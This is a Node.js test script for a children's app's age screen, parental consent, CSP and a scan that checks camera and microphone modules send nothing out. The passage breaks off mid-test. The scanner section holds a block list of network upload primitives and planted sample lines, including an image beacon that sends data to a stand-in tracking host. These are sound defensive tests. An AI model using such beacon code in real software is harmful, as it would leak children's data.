/**
 * The age screen, parental consent, the limits on a child account, revoke and
 * delete, the CSP, and the no-upload build test for the camera and microphone
 * modules.
 *
 *   node scripts/consent-test.js            (the Film blob-URL note is a warning)
 *   node scripts/consent-test.js --strict   (and a failure)
 *
 * Runs the real server (server.js) as a child process on its own copy of the
 * data file, with every model key blanked and the mail going to a temporary dev
 * outbox, so nothing is spent and nothing is sent. The no-upload part only reads
 * files: public/engine/basketball, public/engine/piano and the Basketball_Film
 * block. See curriculum-build/KIDS-CONSENT-IMPLEMENTATION.md.
 */
process.env.NODE_ENV = 'test';
for (const name of Object.keys(process.env)) {
  if (/(_API_KEY|_TOKEN|_SECRET_API|_WORKSPACE)$/.test(name) || /^(OPENROUTER|ANTHROPIC|GEMINI|MIMO|MODELFLARE|DEEPSEEK|MINIMAX|NVIDIA)_.*KEY/.test(name)) process.env[name] = '';
}
// The local model is not a key, so blanking keys does not stop it: a test that
// reached the real Ollama on this laptop waited on it and stalled (2026-10-23).
process.env.OLLAMA_ENABLED = '0';

const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

const ROOT = path.join(__dirname, '..');
const STRICT = process.argv.includes('--strict');

let failures = 0;
let warnings = 0;
function check(label, condition, detail) {
  if (condition) console.log(`  ok   ${label}`);
  else {
    failures++;
    console.log(`  FAIL ${label}${detail !== undefined ? ` — ${typeof detail === 'string' ? detail : JSON.stringify(detail)}` : ''}`);
  }
}
function warn(label) {
  warnings++;
  console.log(`  WARN ${label}`);
}

// ── 1. the no-upload build test (static: reads files, edits nothing) ─────────

/** Strip comments so a URL or a word in a comment is not read as code. */
function stripComments(src) {
  return src
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/(^|[^:'"\\])\/\/[^\n]*/g, '$1');
}

/** The source of one top-level function, by name, from `function name(` to its closing brace. */
function functionBody(src, name) {
  const start = src.indexOf(`function ${name}(`);
  if (start < 0) return null;
  let depth = 0;
  for (let i = src.indexOf('{', start); i < src.length; i++) {
    if (src[i] === '{') depth++;
    else if (src[i] === '}') { depth--; if (depth === 0) return src.slice(start, i + 1); }
  }
  return null;
}

/** Network primitives no camera or microphone module may use (curriculum-build/KIDS-CAMERA-MIC-PRIVACY.md, section 6). */
const FORBIDDEN = [
  ['XMLHttpRequest', /\bXMLHttpRequest\b/],
  ['sendBeacon', /\bsendBeacon\b/],
  ['WebSocket', /\bWebSocket\b/],
  ['EventSource', /\bEventSource\b/],
  ['WebRTC', /\bRTCPeerConnection\b|\bRTCDataChannel\b/],
  ['FormData', /\bFormData\b/],
  ['an upload path', /\/upload\b|\.upload\b|['"`]upload['"`]/i],
  ['a form post', /\.submit\(\)|createElement\(\s*['"]form['"]/],
  // XML namespace names (www.w3.org/2000/svg and friends) are identifiers, not hosts anything is sent to.
  ['an outside host', /\bhttps?:\/\/(?!localhost|127\.0\.0\.1|www\.w3\.org\/(?:2000\/svg|1999\/xhtml|1999\/xlink|1998\/Math\/MathML)['"`])/i],
  ['importScripts', /\bimportScripts\s*\(/],
  ['dynamic import of a URL', /\bimport\s*\(\s*['"`]https?:/],
  ['an image beacon', /new\s+Image\s*\([^)]*\)\s*\.\s*src\s*=|\.src\s*=\s*['"`]https?:/],
];
/** fetch is allowed only for outcome posts and the song library, all under /api/piano/songs. */
const FETCH_ALLOWED = /^\s*['"`]\/api\/piano\/songs/;

function scanSource(raw) {
  const src = stripComments(raw);
  const problems = [];
  for (const [what, re] of FORBIDDEN) if (re.test(src)) problems.push(what);
  const fetches = [...src.matchAll(/\bfetch\s*\(([^,)]*)/g)];
  for (const m of fetches) if (!FETCH_ALLOWED.test(m[1])) problems.push(`fetch(${m[1].trim().slice(0, 40)})`);
  return { problems, src, fetches: fetches.length };
}
function scanModule(file) {
  const raw = fs.readFileSync(file, 'utf8');
  return { rel: path.relative(ROOT, file).replace(/\\/g, '/'), raw, ...scanSource(raw) };
}

function noUploadBuildTest() {
  console.log('\nNo-upload build test: camera and microphone modules');
  // The scanner itself, on planted code: it must catch each way out.
  const planted = [
    "navigator.sendBeacon('/log', blob);",
    "fetch('/api/upload', { method: 'POST', body: blob });",
    'fetch(url, { body: frame });',
    "var ws = new WebSocket('wss://example.com');",
    'var x = new XMLHttpRequest();',
    "var f = new FormData(); f.append('clip', blob);",
    "var img = new Image(); img.src = 'https://track.example/p?d=' + d;",
    'const pc = new RTCPeerConnection();',
  ];
  check('the scanner catches every planted network path', planted.every((p) => scanSource(p).problems.length > 0),
    planted.filter((p) => !scanSource(p).problems.length));
  check('the scanner allows the outcome post, the svg namespace and URLs in comments',
    !scanSource("fetch('/api/piano/songs/' + id + '/result', {}); var ns = 'http://www.w3.org/2000/svg'; // https://x.example").problems.length);
  const dirs = [path.join(ROOT, 'public', 'engine', 'basketball'), path.join(ROOT, 'public', 'engine', 'piano')];
  let scanned = 0;
  for (const dir of dirs) {
    for (const name of fs.readdirSync(dir)) {
      const file = path.join(dir, name);
      if (name.endsWith('.js')) {
        const r = scanModule(file);
        scanned++;
        check(`${r.rel}: no network path other than /api/piano/songs${r.fetches ? ` (${r.fetches} allowed fetch)` : ''}`, !r.problems.length, r.problems);
      } else if (name.endsWith('.html')) {
        const html = fs.readFileSync(file, 'utf8');
        const rel = path.relative(ROOT, file).replace(/\\/g, '/');
        const external = [...html.matchAll(/<(script|link|img|iframe)[^>]+(src|href)\s*=\s*["'](https?:)?\/\/[^"']+/gi)].map((m) => m[0]);
        check(`${rel}: loads nothing from another host`, !external.length, external);
        check(`${rel}: no inline script`, !/<script(?![^>]*\bsrc=)[^>]*>\s*\S/i.test(html));
      }
    }
  }
  check('scanned the camera and microphone modules', scanned >= 8, scanned);

  // The spoken checkpoint's recorder (preschool and Kindergarten, learner
  // follow-ups 2026-10-24): it records with the microphone, so it is held to the
  // same rule, and stricter: no fetch at all, played back from a blob: URL only.
  {
    const r = scanModule(path.join(ROOT, 'public', 'js', 'say-aloud.js'));
    check(`${r.rel}: no network path at all`, !r.problems.length && r.fetches === 0, r.problems);
    check(`${r.rel}: plays the recording back locally and releases the microphone`, /createObjectURL/.test(r.src) && /getTracks\(\)\.forEach\(function \(t\) \{ t\.stop\(\)/.test(r.src));
    check(`${r.rel}: reads aloud with an on-device voice only`, /localService/.test(r.src));
  }

  // The Basketball_Film block on its own: it records a clip with MediaRecorder,
  // so it must have no network path of any kind, not even the allowed ones.
  const blocks = fs.readFileSync(path.join(ROOT, 'public', 'engine', 'basketball', 'basketball-blocks.js'), 'utf8');
  const film = functionBody(blocks, 'renderFilm');
  check('Basketball_Film block found (renderFilm)', !!film);
  if (film) {
    const src = stripComments(film);
    check('Basketball_Film: no fetch, Kit.submit or other network call', !/\bfetch\s*\(|Kit\.submit|sendBeacon|XMLHttpRequest|WebSocket|FormData/.test(src));
    check('Basketball_Film: the clip is only played back and offered as a local download', /createObjectURL/.test(src) && !/\.upload|\/upload/.test(src));
    if (/createObjectURL/.test(src) && !/revokeObjectURL/.test(src)) {
      const note = 'Basketball_Film creates a blob URL for the clip and never revokes it (contract point 6: release it after playback). Owner of public/engine/basketball to fix.';
      if (STRICT) check(note, false); else warn(note);
    }
    if (/getUserMedia/.test(src) && !/getTracks\(\)\.forEach\(function \(t\) \{ t\.stop\(\)/.test(src)) warn('Basketball_Film: camera tracks may not be stopped on every exit path.');
  }

  // Camera and mic modules must say where frames go, in their own words.
  const camera = fs.readFileSync(path.join(ROOT, 'public', 'engine', 'basketball', 'camera-blocks.js'), 'utf8');
  check('camera-blocks.js states that nothing is uploaded', /nothing is uploaded|not uploaded|no picture or clip is uploaded/i.test(camera));
  if (/If you are under 13, ask a parent/.test(camera + blocks)) {
    warn('The in-activity notice is still the old "ask a parent" line; the research doc section 7C has the replacement. Owner of public/engine/basketball to change.');
  }

  // Not a camera/mic engine module, but a microphone recorder that uploads: reported, gated on the server.
  const rec = path.join(ROOT, 'public', 'spanish', 'js', 'core', 'recorder.js');
  if (fs.existsSync(rec)) {
    const r = scanModule(rec);
    if (r.problems.length || r.fetches) {
      console.log(`  note ${r.rel} sends recordings to the server (${[...new Set(r.problems)].join(', ') || `${r.fetches} fetch`}); /api/es/asr and /api/es/upload refuse every child account (routes/consent.js).`);
    }
  }

  // The consent module must know every collection, or deletion would miss rows.
  const dbSrc = fs.readFileSync(path.join(ROOT, 'config', 'db.js'), 'utf8');
  const listed = [...dbSrc.slice(dbSrc.indexOf('const COLLECTIONS'), dbSrc.indexOf('];', dbSrc.indexOf('const COLLECTIONS'))).matchAll(/'([a-z_]+)'/g)].map((m) => m[1]);
  const consentSrc = fs.readFileSync(path.join(ROOT, 'routes', 'consent.js'), 'utf8');
  const known = consentSrc.slice(consentSrc.indexOf('const KNOWN_COLLECTIONS'), consentSrc.indexOf('];', consentSrc.indexOf('const KNOWN_COLLECTIONS')));
  const missing = listed.filter((n) => !known.includes(`'${n}'`));
  check('routes/consent.js knows every collection in config/db.js (so a child deletion reaches every row)', listed.length > 20 && !missing.length, missing);
}

// ── 2. pure functions ─────────────────────────────────────────────────────────

function ageUnitTests() {
  console.log('\nAge screen: the rule');
  // Loaded read-only, on a throwaway store, with the sweep off.
  const consent = require('../routes/consent');
  const now = new Date('2026-10-22T12:00:00Z');
  const route = (y, m, country) => {
    const out = consent.evaluateAge({ birth_year: y, birth_month: m, country }, now);
    return out.error ? 'error' : out.check.needs_parent ? 'parent' : 'self';
  };
  check('US, 12 → parent', route(2014, 1, 'US') === 'parent');
  check('US, 13 last month → self', route(2013, 9, 'US') === 'self');
  check('US, turning 13 this month → parent (counted younger)', route(2013, 10, 'US') === 'parent');
  check('UK (GB), 13 → self', route(2013, 1, 'GB') === 'self');
  check('Germany, 15 → parent', route(2011, 1, 'DE') === 'parent');
  check('Germany, 16 → self', route(2010, 1, 'DE') === 'self');
  check('Netherlands, 15 → parent', route(2011, 1, 'NL') === 'parent');
  check('France, 14 → parent; 15 → self', route(2012, 1, 'FR') === 'parent' && route(2011, 1, 'FR') === 'self');
  check('Spain, 14 → self', route(2012, 1, 'ES') === 'self');
  check('another country, 15 → parent (default 16)', route(2011, 1, 'OTHER') === 'parent');
  check('Canada (listed, not in the age table), 15 → parent (default 16)', route(2011, 1, 'CA') === 'parent');
  check('a date in the future is refused', route(2026, 12, 'US') === 'error');
  check('no country is refused', route(2000, 1, '') === 'error');
  check('no month is refused', route(2000, '', 'US') === 'error');
  check('a year 130 years ago is refused', route(1896, 1, 'US') === 'error');
  const c = consent.evaluateAge({ birth_year: 2014, birth_month: 5, country: 'us' }, now).check;
  check('the stored result has country, month-year, ages, version and time', c.country === 'US' && c.birth_ym === '2014-05'
    && c.age_at_check === 12 && c.consent_age === 13 && c.under_13 === true && !!c.screen_version && !!c.checked_at, c);
  return consent;
}

// ── 3. the running server ─────────────────────────────────────────────────────

function makeClient(base) {
  let cookie = '';
  async function call(method, url, body, extra = {}) {
    const res = await fetch(base + url, {
      method,
      redirect: 'manual',
      headers: {
        Origin: base,
        ...(body !== undefined ? { 'Content-Type': 'application/json' } : {}),
        ...(cookie ? { Cookie: cookie } : {}),
        ...extra,
      },
      body: body !== undefined ? JSON.stringify(body) : undefined,
    });
    const set = res.headers.get('set-cookie');
    if (set) {
      const sid = set.split(';')[0];
      cookie = /=$/.test(sid) || /Expires=Thu, 01 Jan 1970/i.test(set) ? '' : sid;
    }
    let json = null;
    const type = res.headers.get('content-type') || '';
    const text = await res.text();
    if (type.includes('json')) { try { json = JSON.parse(text); } catch { json = null; } }
    return { status: res.status, json, text, headers: res.headers };
  }
  return {
    get: (u, h) => call('GET', u, undefined, h),
    post: (u, b, h) => call('POST', u, b === undefined ? {} : b, h),
    clearCookie: () => { cookie = ''; },
  };
}

function cspOf(res) {
  const out = {};
  for (const part of String(res.headers.get('content-security-policy') || '').split(';')) {
    const [k, ...v] = part.trim().split(/\s+/);
    if (k) out[k] = v;
  }
  return out;
}

function lastMail(outbox, tag, to) {
  if (!fs.existsSync(outbox)) return null;
  const files = fs.readdirSync(outbox).filter((f) => f.endsWith('.json')).sort();
  for (let i = files.length - 1; i >= 0; i--) {
    const m = JSON.parse(fs.readFileSync(path.join(outbox, files[i]), 'utf8'));
    if ((!tag || m.tag === tag) && (!to || m.to === to)) return m;
  }
  return null;
}
const tokenOf = (mail) => {
  const m = mail && mail.text.match(/parent-consent\?token=([A-Za-z0-9_\-%]+)/);
  return m ? decodeURIComponent(m[1]) : null;
};

async function startServer(dbFile, outbox, port) {
  const env = {
    ...process.env,
    NODE_ENV: 'test',
    PORT: String(port),
    DB_FILE: dbFile,
    MAIL_OUTBOX_DIR: outbox,
    CONSENT_SWEEP: 'off',
    ADMIN_EMAILS: 'consent-admin@example.test',
    SESSION_SECRET: crypto.randomBytes(32).toString('hex'),
  };
  delete env.DB_READONLY;
  delete env.APP_ORIGIN;
  const child = spawn(process.execPath, [path.join(ROOT, 'server.js')], { cwd: ROOT, env, stdio: ['ignore', 'pipe', 'pipe'] });
  let log = '';
  child.stdout.on('data', (d) => { log += d; });
  child.stderr.on('data', (d) => { log += d; });
  const base = `http://127.0.0.1:${port}`;
  for (let i = 0; i < 240; i++) {
    try {
      const r = await fetch(`${base}/api/health`);
      if (r.ok) return { child, base, log: () => log };
    } catch { /* not up yet */ }
    if (child.exitCode !== null) break;
    await new Promise((r) => setTimeout(r, 250));
  }
  child.kill();
  throw new Error(`server did not start:\n${log.slice(-2000)}`);
}

// The store is read through the server's admin proof endpoints, never from the
// file while the server runs: on Windows a read can collide with its atomic
// rename and crash it, and the file can lag the server by a flush.

async function serverTests(consent) {
  const work = fs.mkdtempSync(path.join(os.tmpdir(), 'consent-test-'));
  const dbFile = path.join(work, 'db.json');
  const outbox = path.join(work, 'outbox');
  const source = path.join(ROOT, 'data', 'db.json');
  // A copy of the data file (never the original), plus two accounts from "before
  // the age screen": the migration path.
  const store = fs.existsSync(source) ? JSON.parse(fs.readFileSync(source, 'utf8')) : { _counters: {}, users: [] };
  store.users = store.users || [];
  store._counters = store._counters || {};
  const bcrypt = require('bcryptjs');
  const hash = bcrypt.hashSync('old-password-1', 4);
  const nextId = () => { store._counters.users = Math.max(store._counters.users || 0, ...store.users.map((u) => u.id || 0)) + 1; return store._counters.users; };
  const oldKid = { id: nextId(), email: 'old-kid@example.test', display_name: 'Old Kid', password_hash: hash, xp: 0, streak: 0, onboarded: true, created_at: new Date().toISOString() };
  const oldAdult = { id: nextId(), email: 'old-adult@example.test', display_name: 'Old Adult', password_hash: hash, xp: 0, streak: 0, onboarded: true, created_at: new Date().toISOString() };
  store.users.push(oldKid, oldAdult);
  fs.writeFileSync(dbFile, JSON.stringify(store));

  const port = 6900 + Math.floor(Math.random() * 400);
  const server = await startServer(dbFile, outbox, port);
  const { base } = server;
  const thisYear = new Date().getUTCFullYear();
  const kidYear = thisYear - 10;
  const adultYear = thisYear - 30;

  try {
    // ── CSP and headers ─────────────────────────────────────────────────────
    console.log('\nCSP: connect-src');
    const anon = makeClient(base);
    for (const page of ['/', '/register', '/dashboard', '/privacy', '/parent', '/parent-consent', '/base-lesson']) {
      const r = await anon.get(page);
      const csp = cspOf(r);
      check(`${page}: connect-src is 'self' only`, JSON.stringify(csp['connect-src']) === JSON.stringify(["'self'"]), csp['connect-src']);
      check(`${page}: script-src is 'self' only`, JSON.stringify(csp['script-src']) === JSON.stringify(["'self'"]), csp['script-src']);
      const all = Object.values(csp).flat();
      check(`${page}: no other host, wildcard or socket anywhere in the CSP`, !all.some((v) => /^(https?:|wss?:|\*)/.test(v) || v.includes('*')), all.filter((v) => /:|\*/.test(v)));
    }
    for (const page of ['/engine/piano/songs.html', '/engine/piano/demo.html']) {
      const r = await anon.get(page);
      const csp = cspOf(r);
      check(`${page}: connect-src limited to this app's /api/`, JSON.stringify(csp['connect-src']) === JSON.stringify([`${base}/api/`]), csp['connect-src']);
      check(`${page}: script-src is 'self' only (no WebAssembly grant)`, JSON.stringify(csp['script-src']) === JSON.stringify(["'self'"]), csp['script-src']);
    }
    // Basketball body tracking (owner approved 2026-10-24): on the camera pages only,
    // 'wasm-unsafe-eval' and this app's own /vendor/mediapipe/; nothing else, no other host.
    {
      const r = await anon.get('/engine/basketball/demo.html');
      const csp = cspOf(r);
      check('/engine/basketball/demo.html: connect-src is this app\'s /api/ and /vendor/mediapipe/ only', JSON.stringify(csp['connect-src']) === JSON.stringify([`${base}/api/`, `${base}/vendor/mediapipe/`]), csp['connect-src']);
      check('/engine/basketball/demo.html: script-src is \'self\' plus \'wasm-unsafe-eval\' only', JSON.stringify(csp['script-src']) === JSON.stringify(["'self'", "'wasm-unsafe-eval'"]), csp['script-src']);
      const lesson = cspOf(await anon.get('/base-lesson?track=basketball&grade=x&level=1'));
      check('/base-lesson?track=basketball: script-src \'self\' plus \'wasm-unsafe-eval\', connect-src \'self\'', JSON.stringify(lesson['script-src']) === JSON.stringify(["'self'", "'wasm-unsafe-eval'"]) && JSON.stringify(lesson['connect-src']) === JSON.stringify(["'self'"]), [lesson['script-src'], lesson['connect-src']]);
      const other = cspOf(await anon.get('/base-lesson?track=math&grade=x&level=1'));
      check('/base-lesson for another subject: no WebAssembly grant', JSON.stringify(other['script-src']) === JSON.stringify(["'self'"]), other['script-src']);
      const all = [...Object.values(csp).flat(), ...Object.values(lesson).flat()];
      check('camera pages: no other host, wildcard or socket anywhere in the CSP', !all.some((v) => /^(wss?:|\*)/.test(v) || v.includes('*') || (/^https?:/.test(v) && !v.startsWith(base))), all.filter((v) => /:|\*/.test(v)));
    }

    // ── config: no thresholds on the wire ──────────────────────────────────
    console.log('\nAge screen: the HTTP paths');
    const cfg = (await anon.get('/api/consent/config')).json;
    const codes = cfg.countries.map((c) => c.code);
    check('config lists US, GB, DE, NL and "Another country"', ['US', 'GB', 'DE', 'NL', 'OTHER'].every((c) => codes.includes(c)));
    check('config does not reveal any consent age', !/consent_age|"13"|"16"/.test(JSON.stringify(cfg)));
    check('register page has no pre-selected month, year or country', (() => {
      const html = fs.readFileSync(path.join(ROOT, 'public', 'register.html'), 'utf8');
      return /<select id="birth_month"[^>]*><option value="">Month<\/option>/.test(html) && !/selected/.test(html) && !/under 13|13 or older|over 13/i.test(html.split('step-self')[0]);
    })());

    // A child in one browser.
    const kid = makeClient(base);
    let r = await kid.post('/api/consent/age', { birth_year: kidYear, birth_month: 1, country: 'US' });
    check('a 10-year-old in the US goes the parent route', r.status === 200 && r.json.route === 'parent', r.json);
    r = await kid.post('/api/consent/age', { birth_year: adultYear, birth_month: 1, country: 'US' });
    check('answering again with an adult year changes nothing (first answer stands)', r.json.route === 'parent' && r.json.locked === true, r.json);
    r = await kid.post('/api/auth/register', { email: 'kid@example.test', password: 'kidpass123', display_name: 'Kiddo' });
    check('the child cannot make an email account after the parent route', r.status === 400 && /username/i.test(r.json.error), r.json);
    r = await kid.post('/api/auth/register', { username: 'kiddo_1', password: 'kidpass123', display_name: 'Kiddo', parent_email: 'Parent.One@Example.test' });
    check('a child account is created (201)', r.status === 201, r.json);
    const kidUser = r.json && r.json.user;
    check('the child account has no email, a username, the kids audience and a pending consent', kidUser && kidUser.email === null
      && kidUser.username === 'kiddo_1' && kidUser.audience === 'kids' && kidUser.consent.state === 'pending' && kidUser.account_type === 'child', kidUser);
    let mail = lastMail(outbox, 'consent-request', 'parent.one@example.test');
    check('a consent request went to the parent (dev outbox)', !!mail && !!tokenOf(mail), mail && mail.subject);
    check('the request email names the privacy policy and the deletion after no answer', mail && /\/privacy/.test(mail.text) && /deleted after 14 days/.test(mail.text));
    const token1 = tokenOf(mail);

    // An adult in another browser.
    const adult = makeClient(base);
    r = await adult.post('/api/consent/age', { birth_year: adultYear, birth_month: 6, country: 'DE' });
    check('a 30-year-old in Germany goes the self route', r.json.route === 'self', r.json);
    r = await adult.post('/api/auth/register', { email: 'consent-admin@example.test', password: 'adultpass123', display_name: 'Admin Adult' });
    check('the adult account is created with full access', r.status === 201 && r.json.user.consent.state === 'full' && r.json.user.age_needed === false, r.json);

    // A German 15-year-old: parent route under GDPR Art. 8.
    const teen = makeClient(base);
    r = await teen.post('/api/consent/age', { birth_year: thisYear - 15 - 1, birth_month: 12, country: 'DE' });
    check('a 15-year-old in Germany goes the parent route', r.json.route === 'parent', r.json);
    r = await teen.post('/api/consent/age', { birth_year: thisYear - 15 - 1, birth_month: 12, country: 'GB' });
    check('...and stays there when the country is changed', r.json.route === 'parent');

    // Sign-in by username.
    const kid2 = makeClient(base);
    r = await kid2.post('/api/auth/login', { email: 'KIDDO_1', password: 'kidpass123' });
    check('a child signs in with the username', r.status === 200 && r.json.user.username === 'kiddo_1', r.json);

    // ── limits before consent ──────────────────────────────────────────────
    console.log('\nLimits before consent');
    r = await kid.get('/dashboard');
    check('child page: camera and microphone switched off (Permissions-Policy)', /camera=\(\)/.test(r.headers.get('permissions-policy')) && /microphone=\(\)/.test(r.headers.get('permissions-policy')), r.headers.get('permissions-policy'));
    r = await adult.get('/dashboard');
    check('adult page: camera and microphone allowed for this origin', /camera=\(self\)/.test(r.headers.get('permissions-policy')), r.headers.get('permissions-policy'));
    const blocked = [
      ['/api/items/1/coach', { messages: [{ role: 'user', content: 'hi' }] }],
      ['/api/items/1/coach/stream', { messages: [] }],
      ['/api/items/1/ask', { question: 'why' }],
      ['/api/lessons/math/k/1/assist', { target: { type: 'block', index: 0 }, messages: [] }],
      ['/api/essays/1/submit', { text: 'my essay' }],
      ['/api/es/conversation/turn', { levelId: 'x', text: 'hola' }],
      ['/api/es/writing/feedback', { levelId: 'x', draft: 'hola' }],
      ['/api/levels/math/k/1/feedback', { liked: 'the game' }],
      ['/api/profile/survey', { interests: 'space' }],
    ];
    for (const [url, body] of blocked) {
      r = await kid.post(url, body);
      check(`child, before consent: ${url} refused (outside AI)`, r.status === 403 && r.json && r.json.code === 'parent_opt_in_required', [r.status, r.json]);
    }
    r = await kid.post('/api/es/asr', {});
    check('child: /api/es/asr (recording upload) refused', r.status === 403 && r.json.code === 'child_upload_off', r.json);
    r = await kid.post('/api/levels/math/k/1/feedback', { pace: 'right' });
    check('child: level feedback by taps only is not refused by the gate', r.status !== 403, r.status);
    r = await kid.post('/api/profile/survey', {});
    check('child: an empty survey is not refused', r.status === 200, r.status);
    r = await kid.get('/api/catalog');
    check('child: the catalogue (tap-only learning) still works', r.status === 200);
    r = await adult.post('/api/items/999999999/coach', { messages: [] });
    check('adult: the coach is not refused by the gate', !(r.status === 403 && r.json && r.json.code), [r.status, r.json]);
    r = await adult.post('/api/es/conversation/turn', { levelId: 'none', text: 'hola' });
    check('adult: Spanish conversation is not refused by the gate', !(r.status === 403 && r.json && r.json.code), [r.status, r.json]);

    // ── the parent's answer ────────────────────────────────────────────────
    console.log('\nConsent record');
    const parent = makeClient(base);
    r = await parent.get(`/api/consent/request/${token1}`);
    check('the parent opens the request', r.status === 200 && r.json.child.display_name === 'Kiddo' && r.json.parent_account === false, r.json);
    const noticeVersion = r.json.notice_version;
    const noticeHtml = fs.readFileSync(path.join(ROOT, 'public', 'parent-consent.html'), 'utf8');
    check('the notice page carries the same version the server expects', noticeHtml.includes(`data-notice-version="${noticeVersion}"`));
    check('the notice has the camera and microphone paragraph (on-device, results only)', /processed on your child's\s+device/.test(noticeHtml)
      && /never uploads, records or keeps pictures, video or sound/.test(noticeHtml) && /tapping or using the on-screen keys/.test(noticeHtml));
    check('the notice links the privacy policy', /href="\/privacy"/.test(noticeHtml));
    check('the two disclosure opt-ins are separate and unticked', /id="opt_third_party_ai"/.test(noticeHtml) && /id="opt_ai_training"/.test(noticeHtml)
      && !/id="opt_[a-z_]+"[^>]*checked/.test(noticeHtml));
    r = await parent.post(`/api/consent/request/${token1}`, { decision: 'agree', notice_version: 'old', i_am_parent: true, password: 'parentpass1' });
    check('a stale notice version is refused', r.status === 409);
    r = await parent.post(`/api/consent/request/${token1}`, { decision: 'agree', notice_version: noticeVersion, password: 'parentpass1' });
    check('agreeing without confirming parenthood is refused', r.status === 400);
    r = await parent.post(`/api/consent/request/${token1}`, { decision: 'agree', notice_version: noticeVersion, i_am_parent: true, password: 'short' });
    check('a short parent password is refused', r.status === 400);
    const before = Date.now();
    r = await parent.post(`/api/consent/request/${token1}`, {
      decision: 'agree', notice_version: noticeVersion, i_am_parent: true, password: 'parentpass1', opt_third_party_ai: true, opt_ai_training: false,
    });
    check('the parent agrees, asking for outside AI (needs a signed form)', r.status === 200 && r.json.needs_signed_form === true, r.json);
    r = await parent.post(`/api/consent/request/${token1}`, { decision: 'agree', notice_version: noticeVersion, i_am_parent: true, password: 'parentpass1' });
    check('the link works once', r.status === 404);

    let me = (await parent.get('/api/consent/parent/me')).json;
    const rec = me.children && me.children[0];
    check('the parent is signed in and sees the child', me.parent && me.parent.email === 'parent.one@example.test' && rec && rec.child.display_name === 'Kiddo', me);
    const g = rec && rec.granted;
    check('recorded: timestamp', g && Date.parse(g.at) >= before - 1000 && Date.parse(g.at) <= Date.now() + 1000, g);
    check('recorded: method email_plus', g && g.method === 'email_plus');
    check('recorded: notice and policy versions', rec.notice_version === consent.NOTICE_VERSION && g.policy_version === consent.POLICY_VERSION);
    const stored = (await adult.get(`/api/consent/admin/records/${rec.id}`)).json.record;
    check('recorded: a hash of the exact notice page shown', stored && stored.granted.notice_sha256 === crypto.createHash('sha256').update(noticeHtml).digest('hex'));
    check('recorded: the consent token is gone after use', stored && stored.token_hash === null);
    check('recorded: no raw IP address kept', stored && !JSON.stringify(stored).includes('127.0.0.1'));
    check('scopes: account and on-device camera/mic on; outside AI asked for but not on; training off',
      rec.scopes.account_and_learning.active && rec.scopes.camera_mic_on_device.active && rec.scopes.third_party_ai.requested
      && !rec.scopes.third_party_ai.active && !rec.scopes.ai_training.requested, rec.scopes);
    check('the delayed confirmation is scheduled about a day out', rec.confirmation && Date.parse(rec.confirmation.due_at) - Date.now() > 23 * 3600 * 1000 && !rec.confirmation.sent_at, rec.confirmation);

    r = await kid.get('/api/auth/me');
    check('child after consent: active, camera and mic on, outside AI still off', r.json.user.consent.state === 'active'
      && r.json.user.consent.camera_mic === true && r.json.user.consent.ai_free_text === false, r.json.user.consent);
    r = await kid.get('/dashboard');
    check('child after consent: the camera is allowed again on pages', /camera=\(self\)/.test(r.headers.get('permissions-policy')));
    r = await kid.post('/api/items/1/coach', { messages: [] });
    check('child after consent: the coach is still refused until the signed form', r.status === 403 && r.json.code === 'parent_opt_in_required');

    // The operator checks the signed form.
    r = await adult.get('/api/consent/admin/forms');
    check('admin sees the form waiting', r.status === 200 && r.json.waiting.some((w) => w.id === rec.id && w.requested.includes('third_party_ai')), r.json);
    r = await kid.get('/api/consent/admin/forms');
    check('a non-admin gets 404 for the forms list', r.status === 404);
    r = await adult.post(`/api/consent/admin/forms/${rec.id}/verify`, { scope: 'third_party_ai' });
    check('verifying without saying the form was checked is refused', r.status === 400);
    r = await adult.post(`/api/consent/admin/forms/${rec.id}/verify`, { scope: 'third_party_ai', checked: true });
    check('verifying the signed form switches outside AI on', r.status === 200 && r.json.scopes.third_party_ai.active === true && r.json.scopes.third_party_ai.method === 'signed_form');
    r = await kid.post('/api/items/999999999/coach', { messages: [] });
    check('child with the verified opt-in: the coach is no longer refused by the gate', !(r.status === 403 && r.json && r.json.code), [r.status, r.json]);
    r = await kid.post('/api/es/asr', {});
    check('child with the opt-in: recordings are still not uploaded', r.status === 403 && r.json.code === 'child_upload_off');

    // Parent settings and opt-ins.
    console.log('\nParent controls');
    r = await parent.post(`/api/consent/parent/children/${rec.id}/settings`, { camera_mic_off: true });
    check('the parent turns camera and mic off', r.status === 200 && r.json.settings.camera_mic_off === true);
    r = await kid.get('/session');
    check('...and the child\'s pages refuse the camera and microphone', /camera=\(\)/.test(r.headers.get('permissions-policy')));
    r = await parent.post(`/api/consent/parent/children/${rec.id}/settings`, { camera_mic_off: false });
    r = await parent.post(`/api/consent/parent/children/${rec.id}/settings`, { hide_stats: true });
    check('the parent hides the streak and XP for the child, and the camera switch is left as it was', r.status === 200 && r.json.settings.hide_stats === true && r.json.settings.camera_mic_off === false, r.json);
    r = await kid.get('/api/auth/me');
    check('...the child account says so, as the parent choice', r.json.user && r.json.user.hide_stats === true && r.json.user.hide_stats_by_parent === true, r.json);
    r = await parent.post(`/api/consent/parent/children/${rec.id}/settings`, { hide_stats: false });
    check('...and the parent shows them again', r.status === 200 && r.json.settings.hide_stats === false);
    r = await parent.post(`/api/consent/parent/children/${rec.id}/opt-ins`, { third_party_ai: false });
    check('withdrawing the outside-AI opt-in works at once', r.status === 200 && r.json.scopes.third_party_ai.active === false);
    r = await kid.post('/api/items/1/ask', { question: 'why' });
    check('...and the child\'s free text is refused again', r.status === 403 && r.json.code === 'parent_opt_in_required');
    r = await parent.get(`/api/consent/parent/children/${rec.id}/data`);
    check('the parent reviews what is kept', r.status === 200 && r.json.account && r.json.account.username === 'kiddo_1', r.json);
    r = await parent.get(`/api/consent/parent/children/${rec.id}/data?download=1`);
    check('the parent downloads everything as JSON', r.status === 200 && /attachment/.test(r.headers.get('content-disposition') || '') && r.json.consent.id === rec.id);
    r = await kid.get(`/api/consent/parent/children/${rec.id}/data`);
    check('the child cannot use the parent routes', r.status === 401);
    const stranger = makeClient(base);
    r = await stranger.post('/api/consent/parent/login', { email: 'parent.one@example.test', password: 'wrong-password' });
    check('a wrong parent password is refused', r.status === 401);

    // The delayed confirmation (the "plus").
    r = await adult.post('/api/consent/admin/sweep', { at: new Date(Date.now() + 25 * 3600 * 1000).toISOString() });
    check('a day later the sweep sends the confirmation email', r.status === 200 && r.json.confirmed >= 1, r.json);
    mail = lastMail(outbox, 'consent-confirmation', 'parent.one@example.test');
    check('the confirmation says how to withdraw and links the parent page', mail && /withdraw/i.test(mail.text) && /\/parent/.test(mail.text));

